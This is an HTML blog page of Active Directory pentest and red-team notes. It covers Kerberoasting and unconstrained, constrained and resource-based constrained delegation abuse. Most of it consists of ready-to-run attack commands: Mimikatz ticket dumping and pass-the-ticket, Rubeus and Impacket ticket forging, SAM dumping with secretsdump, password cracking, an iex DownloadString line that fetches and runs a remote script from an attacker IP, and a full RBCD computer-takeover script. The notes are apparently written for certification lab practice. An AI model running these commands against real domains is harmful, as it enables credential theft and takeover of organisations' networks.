@@ -1,0 +1,694 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="">
+  <meta property="og:description" content="">
+  
+  <meta property="og:image" content="https://ferreirasc.github.io/post/ad_notes/">
+  <meta property="og:image:type" content="image/jpg">
+  
+  <meta property="og:type" content="article">
+  <meta property="article:author" content="Leonardo Ferreira">
+  
+  <meta property="article:published_time" content="2020-05-29 02:22:20 -0400 -0400">
+  <meta property="fb:app_id" content="128539894229266"/>
+  <meta property="fb:admins" content="1234176778"/>
+  <meta name="generator" content="Hugo 0.53" />
+
+  <title>Active Directory Notes &middot; Leonardo Ferreira</title>
+
+  
+  
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/pure-min.css">
+
+  <!--[if lte IE 8]>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-old-ie-min.css">
+  <![endif]-->
+  <!--[if gt IE 8]><!-->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-min.css">
+  <!--<![endif]-->
+
+  <!--[if lte IE 8]>
+  <link rel="stylesheet" href="https://ferreirasc.github.io/css/side-menu-old-ie.css">
+  <![endif]-->
+  <!--[if gt IE 8]><!-->
+  <link rel="stylesheet" href="https://ferreirasc.github.io/css/side-menu.css">
+  <!--<![endif]-->
+
+  <link rel="stylesheet" href="https://ferreirasc.github.io/css/blackburn.css">
+
+  
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
+
+  
+  <link href="https://fonts.googleapis.com/css?family=Raleway" rel="stylesheet" type="text/css">
+
+  
+  
+
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.1.0/styles/default.min.css">
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.1.0/highlight.min.js"></script>
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+  
+  <link rel="shortcut icon" href="https://ferreirasc.github.io/img/favicon.ico" type="image/x-icon" />
+  
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    TeX: { equationNumbers: { autoNumber: "AMS" } }
+  });
+</script>
+  
+<script type="text/javascript" async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      displayMath: [['$$','$$'], ['\[','\]']],
+      processEscapes: true,
+      processEnvironments: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+      TeX: { 
+          equationNumbers: { autoNumber: "AMS" },
+          extensions: ["AMSmath.js", "AMSsymbols.js"] 
+      }
+    },
+    TeX: {
+      equationNumbers: { autoNumber: "AMS" } 
+    }
+});
+  MathJax.Hub.Queue(function() {
+  
+  
+  
+  var all = MathJax.Hub.getAllJax(), i;
+  for(i = 0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+  }
+});
+</script>
+
+</head>
+
+
+<body>
+<div id="layout">
+
+  
+<a href="#menu" id="menuLink" class="menu-link">
+  
+  <span></span>
+</a>
+<div id="menu">
+
+  
+  <a class="pure-menu-heading brand" href="https://ferreirasc.github.io/"> ferreirasc:~#</a>
+
+
+
+<a class="pure-menu-heading brand" href="https://ferreirasc.github.io/about"><img class="avatar" src="https://ferreirasc.github.io/avatar.jpg"/></a>
+
+
+
+  <div class="pure-menu">
+    <ul class="pure-menu-list">
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="https://ferreirasc.github.io/"><i class='fa fa-home fa-fw'></i>Home</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="https://ferreirasc.github.io/post/"><i class='fa fa-list fa-fw'></i>Posts</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="https://ferreirasc.github.io/about/"><i class='fa fa-user fa-fw'></i>About Me</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="https://ferreirasc.github.io/contact/"><i class='fa fa-phone fa-fw'></i>Contact</a>
+      
+        </li>
+      
+    </ul>
+  </div>
+
+  <div class="pure-menu social">
+  <ul class="pure-menu-list">
+
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://twitter.com/ferreirasc0" target="_blank"><i class="fa fa-twitter-square fa-fw"></i>Twitter</a>
+    </li>
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://facebook.com/ferreirasc" target="_blank"><i class="fa fa-facebook-square fa-fw"></i>Facebook</a>
+    </li>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://linkedin.com/in/ferreirasc" target="_blank"><i class="fa fa-linkedin-square fa-fw"></i>LinkedIn</a>
+    </li>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://github.com/ferreirasc" target="_blank"><i class="fa fa-github-square fa-fw"></i>GitHub</a>
+    </li>
+    
+
+    
+
+    
+
+  </ul>
+</div>
+
+
+  <div>
+  <div class="small-print">
+    <small>&copy; 2016. All rights reserved.</small>
+  </div>
+  <div class="small-print">
+    <small>Built with&nbsp;<a href="https://gohugo.io/" target="_blank">Hugo</a></small>
+    <small>Theme&nbsp;<a href="https://github.com/yoshiharuyamashita/blackburn" target="_blank">Blackburn</a></small>
+  </div>
+</div>
+
+</div>
+
+
+  <div id="main">
+
+
+<div class="header">
+  <h1>Active Directory Notes</h1>
+  <h2></h2>
+</div>
+<div class="content">
+
+  <div class="post-meta">
+
+  <div>
+    <i class="fa fa-calendar fa-fw"></i>
+    <time>28 May 2020, 00:30</time>
+  </div>
+
+  
+
+  
+  
+  
+  <div>
+    <i class="fa fa-folder fa-fw"></i>
+    
+      <a class="post-taxonomy-topic" href="https://ferreirasc.github.io/topics/notes">Notes</a>
+    
+  </div>
+  
+  
+
+  
+  
+  
+  <div>
+    <i class="fa fa-tags fa-fw"></i>
+    
+      <a class="post-taxonomy-tag" href="https://ferreirasc.github.io/tags/pentest">pentest</a>&nbsp;&#47;
+    
+      <a class="post-taxonomy-tag" href="https://ferreirasc.github.io/tags/ad">AD</a>&nbsp;&#47;
+    
+      <a class="post-taxonomy-tag" href="https://ferreirasc.github.io/tags/red-team">red team</a>&nbsp;&#47;
+    
+      <a class="post-taxonomy-tag" href="https://ferreirasc.github.io/tags/crte">CRTE</a>&nbsp;&#47;
+    
+      <a class="post-taxonomy-tag" href="https://ferreirasc.github.io/tags/crtp">CRTP</a>
+    
+  </div>
+  
+  
+  
+  
+  
+  <div>
+    <i class="fa fa-signal fa-fw"></i>
+      <a class="post-taxonomy-level" href="https://ferreirasc.github.io/level/basic">Basic</a>
+  </div>
+  
+  
+
+</div>
+
+
+  <p>AD Notes for Pentesting / RedTeam</p>
+
+<h1 id="roasting">Roasting</h1>
+
+<hr />
+
+<h2 id="kerberoasting"><strong>Kerberoasting</strong></h2>
+
+<p>Kerberoast aims to extract TGS tickets from accounts that have an SPN assigned. As a TGS ticket is encrypted using the account&rsquo;s NTLM hash, if it is possible to crack this ticket, the associated account could be impersonated in AD. In this attack, the focus will be on users who have SPN, since computer accounts by default will have a strong password (hard to crack).</p>
+
+<p>An AD credential is required to perform this attack.</p>
+
+<ul>
+<li><strong><em>Method 1 (Mimikatz)</em></strong></li>
+</ul>
+
+<pre><code class="language-python"># Discover users with SPN set
+Get-NetUser -SPN
+
+# Request a TGS to a specific SPN and load this into memory
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;&lt;SPN_HERE&gt;&quot; (ex: MSSQLSvc/sqlserver.lab.local)
+
+# Export TGS from memory to a kirbi file to be decrypted
+Invoke-Mimikatz -Command '&quot;kerberos::list /export&quot;'
+
+# Crack it
+python.exe .\tgsrepcrack.py .\passwords.txt 'tgs_obtained.kirbi'
+</code></pre>
+
+<ul>
+<li><strong><em>Method 2 (Rubeus)</em></strong></li>
+</ul>
+
+<pre><code class="language-python"># Obtaining TGS tickets (default is jtr format, but you can consider /format:hashcat)
+Rubeus.exe kerberoast /user:user01 /domain:lab.local /dc:dc01.lab.local /rc4:&lt;NTLM_hash&gt; /outfile:hashes.txt
+</code></pre>
+
+<ul>
+<li><strong><em>Method 3 (Impacket)</em></strong></li>
+</ul>
+
+<pre><code class="language-python">python GetUserSPNs.py &lt;domain_name&gt;/&lt;domain_user&gt;:&lt;domain_user_password&gt; -outputfile &lt;output_TGSs_file&gt;
+</code></pre>
+
+<ul>
+<li><strong><em>Method 4 (Invoke-Kerberoast.ps1)</em></strong></li>
+</ul>
+
+<pre><code class="language-python">iex (new-object Net.WebClient).DownloadString(&quot;http://&lt;my_ip_address&gt;/Invoke-Kerberoast.ps1&quot;)
+Invoke-Kerberoast -OutputFormat &lt;TGSs_format [hashcat | john]&gt; | % { $_.Hash } | Out-File -Encoding ASCII &lt;output_TGSs_file&gt;
+</code></pre>
+
+<ul>
+<li><strong><em>Crack it</em></strong></li>
+</ul>
+
+<pre><code class="language-python">hashcat -m 13100 --force &lt;TGSs_file&gt; &lt;passwords_file&gt;
+
+john --format=krb5tgs --wordlist=&lt;passwords_file&gt; &lt;AS_REP_responses_file&gt;
+</code></pre>
+
+<h2 id="asreproasting"><strong>ASREProasting</strong></h2>
+
+<h1 id="ad-delegation">AD Delegation</h1>
+
+<hr />
+
+<h2 id="unconstrained-delegation"><strong>Unconstrained Delegation</strong></h2>
+
+<h3 id="1-overview">1. Overview</h3>
+
+<ul>
+<li>Unconstrained delegation first appeared on Windows Server 2k aiming to solve the &ldquo;Kerberos double hop&rdquo; problem.
+
+<ol>
+<li>User1 wants to access a Service1 that interacts with a ServiceB via Kerberos (Uncostrained delegation is a feature only available for Kerberos auth in AD).</li>
+<li>User1 performs the pre-auth (sending a timestamp encrypted with its NTLM hash) and receives a TGT from the KDC (AS-REQ and AS-REP, respectively).</li>
+<li>User1 sends the TGT back to the KDC, requesting access to Service1. (TGS-REQ).</li>
+<li>KDC recognizes that the computer behind Service1 has Unconstrained Delegation enabled - that is, it has the attribute <code>TrustedForDelegation = true</code>. It will then return a packet containing ((TGS for Service1) + (TGT for User1)) to User1.</li>
+<li>When connecting to Service1, User1 sends the TGS + TGT received in step 4.</li>
+<li>Service1 stores User1&rsquo;s TGT in its LSASS in order to impersonate User1 when accessing Service2 (delegation).</li>
+<li>If User1 needs information from Service2, Service1 will request the KDC using User1&rsquo;s TGT for a TGS for Service2.</li>
+<li>The KDC then returns to Service1 a valid TGS for Service2, Service1 requests directly to Service2 using this TGS and returns the information received to User1.</li>
+</ol></li>
+</ul>
+
+<h3 id="2-enumeration">2. Enumeration</h3>
+
+<p>Finding computers/users with unconstrained delegation:</p>
+
+<ul>
+<li><strong><em>AD Module</em></strong>
+<br /></li>
+</ul>
+
+<pre><code class="language-sh">Get-ADComputer -Filter {TrustedForDelegation -eq $True}
+Get-ADUser -Filter {TrustedForDelegation -eq $True}
+</code></pre>
+
+<ul>
+<li><strong><em>Powerview</em></strong></li>
+</ul>
+
+<pre><code class="language-sh">Import-Module .\PowerView.ps1
+Get-NetComputer -Unconstrained
+Get-NetUser -Unconstrained
+</code></pre>
+
+<h3 id="3-exploitation">3. Exploitation</h3>
+
+<ul>
+<li><strong><em>Mimikatz</em></strong></li>
+</ul>
+
+<p>Inside a computer with unconstrained delegation, check tickets in memory:</p>
+
+<pre><code class="language-python">Invoke-Mimikatz -Command '&quot;sekurlsa::tickets&quot;'
+</code></pre>
+
+<p>Nothing interest? Coerce someone to connect to this box. Some options:</p>
+
+<ul>
+<li>mitm6</li>
+<li>printerbug (spoolsample)</li>
+<li>responder</li>
+</ul>
+
+<p>Check with &ldquo;Invoke-UserHunter&rdquo; for new connections on the server:</p>
+
+<pre><code class="language-python">Invoke-UserHunter -ComputerName servicea.lab.local -Poll 100 -UserName Administrator -Delay 5 -Verbose
+</code></pre>
+
+<p>Once you get the TGT ticket&hellip; extract and inject it to memory using mimikatz:</p>
+
+<pre><code class="language-python">Invoke-Mimikatz -Command '&quot;sekurlsa::tickets /export&quot;'
+Invoke-Mimikatz -Command '&quot;kerberos::ptt tgt_obtained.kirbi&quot;'
+</code></pre>
+
+<ul>
+<li><strong><em>Rubeus</em></strong></li>
+</ul>
+
+<p>Monitor new TGT tickets on memory with Rubeus monitor:</p>
+
+<pre><code class="language-python">Rubeus.exe monitor /interval:1
+</code></pre>
+
+<p>After getting a privileged TGT&hellip; just copy the base64 string and paste on this way:</p>
+
+<pre><code class="language-python">Rubeus.exe ptt /ticket:&lt;base64_string&gt;
+</code></pre>
+
+<p>Check <code>klist</code> and enjoy. o/</p>
+
+<hr />
+
+<h2 id="constrained-delegation"><strong>Constrained Delegation</strong></h2>
+
+<h3 id="1-overview-1">1. Overview</h3>
+
+<ul>
+<li>Unlike Unconstrained Delegation, where it would be possible to delegate privileges to any computer, the basic principle behind Constrained Delegation is that a service can only delegate privileges for specific SPNs (e.g., CIFS/computerA.lab.local).</li>
+<li>A typical scenario where Constrained Delegation is applied: Users need to connect to a service, <strong>but without using Kerberos authentication</strong> (using other ways to authenticate, such as NTLM or even form-based authentication). For this scenario, AD created extensions that would allow the first hop service to impersonate users: <strong>Service for User to Self (S4U2self)</strong> and <strong>Service for User to Proxy (S4U2Proxy)</strong>.
+
+<ol>
+<li>User1 makes a request to Service1. The user is authenticated, but Service1 does not have the user&rsquo;s authorization data. Typically this is due to the authentication being performed by some means other than Kerberos (form-based or NTLM).</li>
+<li>Service1, which has already authenticated with the KDC and has obtained its TGT (AS-REQ + AS-REP), asks for a TGS to itself (also called &ldquo;forwardable TGS&rdquo;) on behalf of the named user by using the S4U2self extension <strong><em>(User1 is identified on S4U2self simply by its username and realm name - opportunity to impersonate!)</em></strong>.</li>
+<li>The KDC returns a forwardable TGS addressed to Service1 as if it had been requested from the user with the user&rsquo;s own TGT. The service ticket might contain the authorization data of the user (what he can/cannot access in Service1).</li>
+<li>User1 makes then a request to Service1. Service1 needs to access resources on Service2 as the user (delegation). However, Service1 does not have a forwarded TGT from the user to perform delegation by a forwarded TGT, as described before for Unconstrained Delegation. Thus, two preconditions need to be met by service1 so that it can delegate User1 privileges to Service2:
+
+<ul>
+<li>Have a valid TGT. (That is, having already authenticated to Kerberos - AS-REQ + AS-REP)</li>
+<li>Have a forwardable TGS, that is, a TGS to itself on behalf of User1. Service1 must always present the forwardable TGS obtained in the previous step (via S42Uself) for the S4UProxy extension as a proof that the user, who is being impersonated by Service1, has already authenticated himself in Service1 before.</li>
+</ul></li>
+<li>If Service1 meets these two preconditions, it can request a TGS for Service2 on the KDC via the S4U2Proxy extension.</li>
+<li>Service1 then requests to the KDC a TGS to Service2 on behalf of User1 via S42UProxy extension. Again, User1 is identified by its name and realm contained in the forwardable TGS for Service1 (step 2 and 3).</li>
+<li>KDC returns a TGS for Service 2, but the client identity stored in the cname and crealm fields of the TGS are that of the User1, not Service 1.</li>
+<li>Finally, Service1 uses the service ticket to make a request to Service2. Service2 treats this request as coming from the user and assumes that the user was authenticated by the KDC.</li>
+<li>Service2 responds to the request.</li>
+<li>Service1 responds to the User1 request.</li>
+</ol></li>
+</ul>
+
+<h3 id="2-enumeration-1">2. Enumeration</h3>
+
+<p>Finding computers/users with constrained delegation:</p>
+
+<pre><code class="language-python">. .\PowerView.ps1
+Get-DomainUser -TrustedToAuth
+Get-DomainComputer -TrustedToAuth
+</code></pre>
+
+<h3 id="3-exploitation-1">3. Exploitation</h3>
+
+<p>Ask a TGT to impersonate the user allowed to delegate privileges (lab.local\sqlservice) and then request a s4u (s4u2self + s4u2proxy) on behalf of a high privileged user (lab.local\Administrator).</p>
+
+<ul>
+<li><strong><em>Rubeus</em></strong></li>
+</ul>
+
+<p>As sqlservice has &ldquo;CIFS/DC01LAB.lab.local&rdquo; set on your <strong>msDS-AllowedToDelegateTo</strong> property, it would be possible to consider another service available for this same computer, such as ldap (in a DC, it would allow DCSync). The <code>/altservice</code> parameter do the work!</p>
+
+<pre><code class="language-python">Rubeus.exe asktgt /user:sqlservice /domain:lab.local /rc4:&lt;NTLM_hash&gt; /outfile:tgt.kirbi
+Rubeus.exe s4u /ticket:tgt.kirbi /impersonateuser:Administrator /msdsspn:cifs/DC01LAB.lab.local /altservice:ldap /ptt
+</code></pre>
+
+<p>Or all-in-one command:</p>
+
+<pre><code class="language-python">Rubeus.exe s4u /user:sqlservice /domain:lab.local /rc4:&lt;NTLM_hash&gt; /impersonateuser:Administrator /msdsspn:cifs/DC01LAB.lab.local /ptt
+</code></pre>
+
+<ul>
+<li><strong><em>Kekeo + Mimikatz</em></strong></li>
+</ul>
+
+<pre><code class="language-python">.\kekeo.exe
+tgt::ask /user:sqlservice /password:&lt;PASS&gt; /domain:lab.local
+tgs::s4u /tgt:TGT_sqlservice@LAB.LOCAL_krbtgt~lab.local@LAB.LOCAL.kirbi /user:Administrator@lab.local /service:cifs/DC01LAB.lab.local
+exit
+</code></pre>
+
+<p>Use mimikatz to inject this ticket in-memory:</p>
+
+<pre><code class="language-sh">Invoke-Mimikatz -Command '&quot;kerberos::ptt TGS_Administrator@lab.local@LAB.LOCAL_cifs~DC01LAB.lab.local@LAB.LOCAL.kirbi&quot;'
+</code></pre>
+
+<p>Check with <code>klist</code> to verify that everything went well.</p>
+
+<ul>
+<li><strong><em>Impacket</em></strong></li>
+</ul>
+
+<pre><code class="language-python">getST.py -spn cifs/DC01LAB.lab.local -impersonate Administrator lab.local/sqlservice:'&lt;PASS&gt;'
+export KRB5CCNAME=Administrator.ccache
+</code></pre>
+
+<p>Having access to CIFS&hellip; we can dump SAM database.</p>
+
+<pre><code class="language-sh">secretsdump.py -k -no-pass DC01LAB.lab.local
+</code></pre>
+
+<hr />
+
+<h2 id="resource-based-constrained-delegation-rbcd"><strong>Resource-Based Constrained Delegation (RBCD)</strong></h2>
+
+<h3 id="1-overview-2">1. Overview</h3>
+
+<ul>
+<li>Feature that initially appeared in Windows Server 2012, as a new method for &ldquo;delegation&rdquo;, based on constrained delegation.</li>
+<li>It is very similar to the classic constrained delegation but works in the opposite direction. <a href="https://twitter.com/elad_shamir">@elad_shamir</a> did a brilliant and detailed post about RBCD on his blog: <a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">Wagging the Dog</a>.</li>
+<li>Classic constrained delegation from serviceA to serviceB is configured on serviceA in the &ldquo;msDS-AllowedToDelegateTo&rdquo; attribute, and defines an “outgoing” trust from serviceA to serviceB, while resource-based constrained delegation is configured on serviceB in the &ldquo;msDS-AllowedToActOnBehalfOfOtherIdentity&rdquo; attribute, and defines an “incoming” trust from serviceA to serviceB.</li>
+<li><strong>A key point</strong>, and demonstrated by @elad_shamir in his blogspot, is that the UserAccountControl flag <strong>&ldquo;TrustedToAuthForDelegation&rdquo; is not really required to perform S4U2Self</strong>. What actually happens is that if a user who does not have &ldquo;TrustedToAuthForDelegation&rdquo; performs S4U2Self, a non-forwardable TGS will be returned.</li>
+<li>A non-forwardable TGS would not be valid for S4U2Proxy in a classic constrained delegation, <strong>but it would be valid for Resource-Based Constrained Delegation</strong>.</li>
+<li>Thus, if we have DACL rights for a computer (e.g., GenericAll) and a user with SPN set, it would be possible to achieve a &ldquo;computer takeover&rdquo; via RBCD. As every regular user in AD has privileges to create up to 10 computer accounts, it would be easy to get an account with SPN. The <a href="https://github.com/Kevin-Robertson/Powermad">Powermad</a> tool could be used for this.</li>
+<li>The generic abuse case would work as follows (from <a href="https://twitter.com/elad_shamir">@elad_shamir</a> blogpost):
+
+<ol>
+<li>The attacker compromises an account that has an SPN or creates one (“Service A”) and the DACL to configure resource-based constrained delegation on a computer account (“Service B”).</li>
+<li>The attacker configures resource-based constrained delegation from Service A to Service B.</li>
+<li>The attacker uses Rubeus to perform a full S4U attack (S4U2Self and S4U2Proxy) from Service A to Service B for a user with privileged access to Service B (e.g., Domain\Administrator).</li>
+<li>The attacker can pass-the-ticket and impersonate the user to gain access to Service B.</li>
+</ol></li>
+</ul>
+
+<h3 id="2-enumeration-2">2. Enumeration</h3>
+
+<p>In most exploitation scenarios involving RBCD, we are interested in AD objects that have write privileges to a computer (e.g., GenericWrite, GenericAll, WriteDACL).</p>
+
+<p>Assuming that we have already compromised an AD user account &ldquo;UserA&rdquo;, PowerView could be used to check the privileges of this user against an arbitrary computer account &ldquo;ComputerA&rdquo;:</p>
+
+<pre><code class="language-python">$SID = Get-DomainUser UserA -Properties objectsid | select -exp objectsid
+Get-DomainObjectAcl computerA.lab.local | ?{$_.SecurityIdentifier -eq $SID}
+</code></pre>
+
+<p>If the &ldquo;ActiveDirectoryRights&rdquo; returned from &ldquo;Get-DomainObjectAcl&rdquo; command indicates GenericWrite/GenericAll/WriteDACL, it would be possible to compromise this computer via RBCD.</p>
+
+<h3 id="3-exploitation-2">3. Exploitation</h3>
+
+<p><em>Source: <a href="https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff">https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff</a></em> (<a href="https://twitter.com/harmj0y">@harmj0y</a>)</p>
+
+<pre><code class="language-python">Import-Module .\powermad.ps1 # To add a new computer account
+Import-Module .\powerview.ps1 # To the most of the commands
+
+# Computer object we're taking over
+$TargetComputer = &quot;computerA.lab.local&quot;
+
+# verify the GenericWrite permissions on $TargetComputer
+$AttackerSID = Get-DomainUser attacker -Properties objectsid | Select -Expand objectsid
+$ACE = Get-DomainObjectACL $TargetComputer | ?{$_.SecurityIdentifier -match $AttackerSID}
+ConvertFrom-SID $ACE.SecurityIdentifier
+
+# add a new machine account that we control
+New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
+
+# get the SID of the new computer we've added
+$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
+
+# build the new raw security descriptor with this computer account as the principal
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))&quot;
+
+# get the binary bytes for the SDDL
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0)
+
+# set new security descriptor for 'msds-allowedtoactonbehalfofotheridentity'
+Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+
+# confirming the security descriptor add
+$RawBytes = Get-DomainComputer $TargetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
+$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
+$Descriptor.DiscretionaryAcl
+
+# currently don't have access to primary\C$
+dir \\computerA.lab.local\C$
+
+# Invoke s4u (s4u2self + s4u2proxy) impersonating an DA account
+.\Rubeus.exe s4u /user:attackersystem$ /rc4:&lt;NTLM_hash_from_attackersystem&gt; /impersonateuser:Administrator /msdsspn:cifs/computerA.lab.local /ptt
+
+# Access CIFS!
+dir \\computerA.lab.local\C$
+
+# cleanup - clear msds-allowedtoactonbehalfofotheridentity
+Get-DomainComputer $TargetComputer | Set-DomainObject -Clear 'msds-allowedtoactonbehalfofotheridentity'
+</code></pre>
+
+<hr><br>
+  
+  
+  <small><i class="fa fa-lightbulb-o" aria-hidden="true"></i> Last modified: May 29, 2020</small>  
+</hr>
+
+  
+<div class="prev-next-post pure-g">
+  <div class="pure-u-1-24" style="text-align: left;">
+    
+    <a href="https://ferreirasc.github.io/post/crte_review/"><i class="fa fa-chevron-left"></i></a>
+    
+  </div>
+  <div class="pure-u-10-24">
+    
+    <nav class="prev">
+      <a href="https://ferreirasc.github.io/post/crte_review/">Certified Red Team Expert (CRTE) - Review</a>
+    </nav>
+    
+  </div>
+  <div class="pure-u-2-24">
+    &nbsp;
+  </div>
+  <div class="pure-u-10-24">
+    
+  </div>
+  <div class="pure-u-1-24" style="text-align: right;">
+    
+  </div>
+</div>
+
+
+  
+
+  
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+
+(function() {
+    
+    
+    if (window.location.hostname == "localhost")
+        return;
+
+    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+    var disqus_shortname = 'ferreirasc';
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+</div>
+
+</div>
+</div>
+<script src="https://ferreirasc.github.io/js/ui.js"></script>
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-77924066-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+
+
+
+</body>
+</html>
+
